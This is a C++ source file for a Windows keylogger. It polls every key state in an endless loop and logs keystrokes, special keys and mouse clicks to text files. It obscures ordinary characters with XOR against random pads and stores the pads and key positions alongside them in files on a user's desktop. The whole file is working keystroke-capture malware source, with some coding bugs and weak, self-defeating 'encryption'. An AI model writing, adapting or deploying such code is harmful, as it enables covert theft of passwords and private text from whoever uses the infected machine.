#include<Windows.h>
#include<iostream>
#pragma comment(lib, "user32.lib")
#include<fstream>
#include<stdio.h>
#include<string>
#include<vector>


using namespace std;
void RecordToLog(LPCSTR text)
{
	ofstream logfile;
	logfile.open("keylogs.txt", fstream::app);
	logfile << text;
	logfile.close();
}

bool VKCodes(int ikey)
{
	switch (ikey)
	{
	case VK_SPACE:
		cout << "";
		RecordToLog("");
		break;
	case VK_RETURN:
		cout << "\n";
		RecordToLog("\n");
		break;
	case VK_SHIFT:
		cout << " *Shift* ";
		RecordToLog("Shift");
		break;
	case VK_BACK:
		cout << "\b";
		RecordToLog("\b");
		break;
	case VK_RBUTTON:
		cout << " *rclick* ";
		RecordToLog(" *rclick* ");
		break;
	case VK_LBUTTON:
		cout << " *lclick* ";
		RecordToLog(" lclick ");
		break;
	case VK_CANCEL:
		cout << " *cancel* ";
		RecordToLog(" cancel ");
		break;
	case VK_TAB:
		cout << " *tab* ";
		RecordToLog(" tab ");
		break;
	case VK_CONTROL:
		cout << " *control* ";
		RecordToLog(" control ");
		break;
	case VK_PAUSE:
		cout << " *pause* ";
		RecordToLog(" pause ");
		break;
	case VK_CAPITAL:
		cout << " *capital* ";
		RecordToLog(" capital ");
		break;
	case VK_ESCAPE:
		cout << " *escape* ";
		RecordToLog(" escape ");
		break;
	case VK_PRIOR:
		cout << " *prior* ";
		RecordToLog(" prior ");
		break;
	case VK_NEXT:
		cout << " *next* ";
		RecordToLog(" next ");
		break;
	case VK_END:
		cout << " *end* ";
		RecordToLog(" end ");
		break;
	case VK_HOME:
		cout << " *home* ";
		RecordToLog(" home ");
		break;
	case VK_LEFT:
		cout << " *left* ";
		RecordToLog(" left ");
		break;
	case VK_UP:
		cout << " *buttonUp* ";
		RecordToLog(" buttonUp ");
		break;
	case VK_RIGHT:
		cout << " *right* ";
		RecordToLog(" right ");
		break;
	case VK_DOWN:
		cout << " *down* ";
		RecordToLog(" down ");
		break;
	case VK_SELECT:
		cout << " *select* ";
		RecordToLog(" select ");
		break;
	case VK_DELETE:
		cout << " *delete* ";
		RecordToLog(" delete ");
		break;
	case VK_INSERT:
		cout << " *insert* ";
		RecordToLog(" insert ");
		break;
	case VK_MULTIPLY:
		cout << " *mutiply* ";
		RecordToLog(" mutiply ");
		break;
	case VK_ADD:
		cout << " *add* ";
		RecordToLog(" add ");
		break;
	case VK_SUBTRACT:
		cout << " *subtract* ";
		RecordToLog(" subtract ");
		break;
	case VK_DIVIDE:
		cout << " *divide* ";
		RecordToLog(" divide ");
		break;
	case VK_NUMLOCK:
		cout << " *numlock* ";
		RecordToLog(" numlock ");
		break;
	default: return false;
	}
}

void generateKey(char* keyCharacters)
{

	ifstream KeyStorageFile("C:/Users/SRIRAM/Desktop/Log/Key.txt");
	//KeyFile.open("C:/Users/SRIRAM/Desktop/Log/Key.txt", ios::app);

	int keyindex = 0;
	vector<string> storedKey;
	for (std::string line; getline(KeyStorageFile, line); keyindex++)
	{
		storedKey.push_back(line);
	}


	//char keyCharacters[8];

	again :
	for (int i = 0; i < sizeof(keyCharacters); i++)
	{
		keyCharacters[i] = (char)rand() % 128 + 1;
	}
	for (auto i : storedKey) {
		if (i.compare(keyCharacters) == 0)
		{
			goto again;
		}
	}

	//return keyCharacters;
}

int main()
{
	char key;
	while (TRUE)
	{
		Sleep(10);
		for (key = 8; key <= 190; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				if (VKCodes(key) == FALSE)
				{
					char keyCharacters[8];
					ofstream KeyFile;
					KeyFile.open("C:/Users/SRIRAM/Desktop/Log/Key.txt", ios::app);
					//char otpKey[] = 
						generateKey(keyCharacters);
					KeyFile << keyCharacters << "\n";

					char padding[7];

					for (int i = 0; i < sizeof(padding); i++)
					{
						padding[i] = (char) rand() % 128 + 1;
					}

					char plaintext[8];
					int keyPosition = rand() % 7 + 0;

					ofstream KeyPositionFile;
					KeyPositionFile.open("C:/Users/SRIRAM/Desktop/Log/KeyPosition.txt", ios::app);
					KeyPositionFile << keyPosition << "\n";

					for (int i = 0,j =0; i < sizeof(plaintext); i++)
					{
						if (i == keyPosition)
						{
							plaintext[i] = (char)key;
						}
						else {
							plaintext[i] = (char)padding[j];
							++j;
						}
					}

					//encryption
					char cipher[8];

					for (int i = 0; i < sizeof(cipher); i++)
					{
						cipher[i] = plaintext[i] ^ keyCharacters[i];
					}
					ofstream CipherTextLogfile;
					CipherTextLogfile.open("C:/Users/SRIRAM/Desktop/Log/CipherTextLogfile.txt", ios::app);
					CipherTextLogfile << cipher << "\n";

					
					//Decryption
					char result = cipher[keyPosition] ^ keyCharacters[keyPosition];

					key = key;
					//ofstream logfile;
					cout << key;
					/*logfile.open("keylogs.txt",fstream::app);

					logfile<<key;
					logfile.close();*/
				}

			}
		}
	}
	return 0;
}